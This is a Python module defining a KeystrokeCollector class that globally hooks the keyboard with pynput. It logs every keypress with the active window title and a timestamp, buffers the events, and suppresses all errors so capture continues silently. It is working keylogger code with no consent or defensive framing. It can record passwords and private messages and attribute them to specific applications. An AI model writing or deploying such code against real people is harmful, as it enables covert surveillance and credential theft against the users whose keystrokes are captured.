"""
Keystroke monitoring collector.
Hooks the system keyboard to record keystrokes and buffers them thread-safely.
"""
import threading
from datetime import datetime, timezone
from pynput import keyboard
import pygetwindow

class KeystrokeCollector:
    """
    Hooks the system keyboard using pynput and buffers keystrokes.
    """
    def __init__(self) -> None:
        self._buffer: list[dict] = []
        self._lock = threading.Lock()
        self._listener: keyboard.Listener | None = None
        
    def start(self) -> None:
        """Starts the background keyboard listener daemon thread."""
        # pynput Listener is naturally a daemon thread.
        self._listener = keyboard.Listener(on_press=self._on_press)
        self._listener.start()
        
    def stop(self) -> None:
        """Stops the underlying keyboard listener correctly."""
        if self._listener is not None:
            self._listener.stop()
            self._listener = None
            
    def flush(self) -> list[dict]:
        """Atomically returns and clears the current buffer."""
        with self._lock:
            data = self._buffer.copy()
            self._buffer.clear()
            return data
            
    def _on_press(self, key) -> None:
        """Callback fired by pynput synchronously upon every physical keystroke."""
        try:
            # Handle standard character keys vs special keys (like space, enter, shift)
            try:
                key_data = key.char
            except AttributeError:
                key_data = str(key)
                
            if key_data is None:
                key_data = "Unknown"
                
            # Attempt to grab the active window where the keystroke occurred
            app_name = "Unknown"
            try:
                active_win = pygetwindow.getActiveWindow()
                if active_win and active_win.title:
                    app_name = active_win.title
            except Exception:
                pass
                
            event = {
                "application": app_name,
                "key_data": key_data,
                "captured_at": datetime.now(timezone.utc).isoformat()
            }
            
            with self._lock:
                self._buffer.append(event)
                
        except Exception:
            # Catch entirely so a listener callback crash doesn't murder the pynput thread
            pass
